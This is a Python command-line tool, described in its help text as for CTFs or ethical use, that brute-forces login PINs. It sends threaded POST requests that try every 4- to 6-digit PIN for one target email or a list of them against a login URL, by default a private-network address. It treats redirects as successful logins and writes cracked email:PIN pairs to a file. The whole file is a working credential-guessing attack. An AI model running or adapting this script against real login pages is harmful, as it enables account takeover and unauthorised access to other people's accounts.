#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import itertools
import argparse
import time
import threading

attempts = 0
attempts_lock = threading.Lock()

def attack(url, email, pin, delay, verbose, email_param="email", pin_param="pin"):
    global attempts
    session = requests.Session()
    data = {email_param: email, pin_param: pin}

    try:
        response = session.post(url, data=data, allow_redirects=False)

        with attempts_lock:
            attempts += 1
            if verbose and attempts % 100 == 0:
                print(f"[~] Attempts: {attempts} | Current: {email}:{pin}")

        # On redirect, response.status_code == 302
        if "success" in response.headers.get("Location", "") or response.status_code == 302:
            print(f"[+] SUCCESS: {email}:{pin}")
            with open("hits.txt", "a") as f:
                f.write(f"{email}:{pin}\n")
    except Exception as e:
        print(f"[!] Error with {email}:{pin} — {e}")
    
    if delay > 0:
        time.sleep(delay)

def generate_pins(min_len, max_len, charset):
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            yield ''.join(combo)

def main():
    parser = argparse.ArgumentParser(description="Brute force login utility (for CTFs / ethical use)")
    parser.add_argument("--min-digits", type=int, default=4, help="Minimum length of PIN")
    parser.add_argument("--max-digits", type=int, default=6, help="Maximum length of PIN")
    parser.add_argument("--email", type=str, help="Target email")
    parser.add_argument("--email-file", type=str, default="emails.txt", help="File containing list of target emails")
    parser.add_argument("--url", type=str, default="http://192.168.1.218:5000/login", help="Target login URL")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay (in seconds) between attempts")
    parser.add_argument("--charset", type=str, default="0123456789", help="Character set to use for PIN generation")
    parser.add_argument("--verbose", action="store_true", help="Enable status updates during brute force")
    parser.add_argument("--email-param", type=str, default="email", help="Parameter name for email")
    parser.add_argument("--pin-param", type=str, default="pin", help="Parameter name for PIN")
    
    args = parser.parse_args()


    print(f"[*] Target URL: {args.url}")
    print(f"[*] Using email: {args.email}")
    print(f"[*] Using email file: {args.email_file}")
    print(f"[*] Digits: {args.min_digits} to {args.max_digits}")
    print(f"[*] Threads: {args.threads}")
    print(f"[*] Charset: {args.charset}")
    print(f"[*] Delay: {args.delay} seconds")
    print(f"[*] Verbose: {args.verbose}")

    if args.email:
        emails = [args.email]
    elif args.email_file:
        with open(args.email_file, 'r') as f:
            emails = [line.strip() for line in f if line.strip()]
    else:
        raise ValueError("Either --email or --email-file must be specified")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for email in emails:
            for pin in generate_pins(args.min_digits, args.max_digits, args.charset):
                futures.append(executor.submit(attack, args.url, email, pin, args.delay, args.verbose))

        for _ in as_completed(futures):
            pass  # Keeps the thread pool from exiting early

if __name__ == '__main__':
    main()

    print(f"[*] Total attempts: {attempts}") 
